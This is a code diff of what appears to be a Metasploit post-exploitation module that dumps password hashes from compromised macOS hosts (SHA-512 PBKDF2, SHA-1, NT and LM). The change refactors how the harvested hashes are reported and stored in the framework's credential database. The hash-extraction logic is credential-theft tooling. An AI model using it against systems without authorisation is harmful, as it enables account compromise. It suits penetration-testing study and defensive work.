@@ -42,9 +42,6 @@ class Metasploit3 < Msf::Post
   def run
     fail_with("Insufficient Privileges: must be running as root to dump the hashes") unless root?
 
-    # build a single hash_file containing all users' hashes
-    hash_file = ''
-
     # iterate over all users
     users.each do |user|
       next if datastore['MATCHUSER'].present? and datastore['MATCHUSER'] !~ user
@@ -70,27 +67,25 @@ class Metasploit3 < Msf::Post
         iterations = dict.elements[4].text.gsub(/\s+/, '')
         salt = Rex::Text.to_hex(dict.elements[6].text.gsub(/\s+/, '').unpack('m*')[0], '')
 
-        # PBKDF2 stored in <user, iterations, salt, entropy> format
-        decoded_hash = "#{user}:$ml$#{iterations}$#{salt}$#{entropy}"
-        print_good "SHA512:#{decoded_hash}"
-        hash_file << decoded_hash
+        # PBKDF2 stored in <iterations, salt, entropy> format
+        decoded_hash = "$ml$#{iterations}$#{salt}$#{entropy}"
+        report_hash("SHA-512 PBKDF2", decoded_hash, user)
       elsif lion? # 10.7
         # pull the shadow from dscl
         shadow_bytes = grab_shadow_blob(user)
         next if shadow_bytes.blank?
 
         # on 10.7 the ShadowHashData is stored in plaintext
-        hash_decoded = shadow_bytes.upcase
+        hash_decoded = shadow_bytes.downcase
 
         # Check if NT HASH is present
-        if hash_decoded =~ /4F1010/
-          report_nt_hash(hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)[0][0], user)
+        if hash_decoded =~ /4f1010/
+          report_hash("NT", hash_decoded.scan(/^\w*4f1010(\w*)4f1044/)[0][0], user)
         end
 
         # slice out the sha512 hash + salt
-        sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
-        print_status("SHA512:#{user}:#{sha512}")
-        hash_file << "#{user}:#{sha512}\n"
+        sha512 = hash_decoded.scan(/^\w*4f1044(\w*)(080b190|080d101e31)/)[0][0]
+        report_hash("SHA-512", sha512, user)
       else # 10.6 and below
         # On 10.6 and below, SHA-1 is used for encryption
         guid = if gte_leopard?
@@ -106,38 +101,16 @@ class Metasploit3 < Msf::Post
 
         # Check that we have the hashes and save them
         if sha1_hash !~ /0000000000000000000000000/
-          print_status("SHA1:#{user}:#{sha1_hash}")
-          hash_file << "#{user}:#{sha1_hash}"
+          report_hash("SHA-1", sha1_hash, user)
         end
         if nt_hash !~ /000000000000000/
-          report_nt_hash(nt_hash, user)
+          report_hash("NT", nt_hash, user)
         end
         if lm_hash !~ /0000000000000/
-          print_status("LM:#{user}:#{lm_hash}")
-          print_status("Credential saved in database.")
-          report_auth_info(
-            :host   => host,
-            :port   => 445,
-            :sname  => 'smb',
-            :user   => user,
-            :pass   => "#{lm_hash}:",
-            :active => true
-          )
+          report_hash("LM", lm_hash, user)
         end
       end
     end
-    # Save pwd file
-    upassf = if gt_lion?
-      store_loot("osx.hashes.sha512pbkdf2", "text/plain", session, hash_file,
-                 "unshadowed_passwd.pwd", "OSX Unshadowed SHA-512PBKDF2 Password File")
-    elsif lion?
-      store_loot("osx.hashes.sha512", "text/plain", session, hash_file,
-                 "unshadowed_passwd.pwd", "OSX Unshadowed SHA-512 Password File")
-    else
-      store_loot("osx.hashes.sha1", "text/plain", session, hash_file,
-                 "unshadowed_passwd.pwd", "OSX Unshadowed SHA-1 Password File")
-    end
-    print_good("Unshadowed Password File: #{upassf}")
   end
 
   private
@@ -189,19 +162,31 @@ class Metasploit3 < Msf::Post
     return fields
   end
 
-  # reports the NT hash info to metasploit backend
-  def report_nt_hash(nt_hash, user)
-    return unless nt_hash.present?
-    print_status("NT:#{user}:#{nt_hash}")
-    print_status("Credential saved in database.")
-    report_auth_info(
-      :host   => host,
-      :port   => 445,
-      :sname  => 'smb',
-      :user   => user,
-      :pass   => "AAD3B435B51404EE:#{nt_hash}",
-      :active => true
+  # reports the hash info to metasploit backend
+  def report_hash(type, hash, user)
+    return unless hash.present?
+    print_status("#{type}:#{user}:#{hash}")
+    case type
+    when "NT"
+      private_data = "#{Metasploit::Credential::NTLMHash::BLANK_LM_HASH}:#{hash}"
+      private_type = :ntlm_hash
+    when "LM"
+      private_data = "#{hash}:#{Metasploit::Credential::NTLMHash::BLANK_NT_HASH}"
+      private_type = :ntlm_hash
+    when "SHA-512 PBKDF2", "SHA-512", "SHA-1"
+      private_data = hash
+      private_type = :nonreplayable_hash
+    end
+    create_credential(
+      workspace_id: myworkspace_id,
+      origin_type: :session,
+      session_id: session_db_id,
+      post_reference_name: self.refname,
+      username: user,
+      private_data: private_data,
+      private_type: private_type
     )
+    print_status("Credential saved in database.")
   end
 
   # Checks if running as root on the target
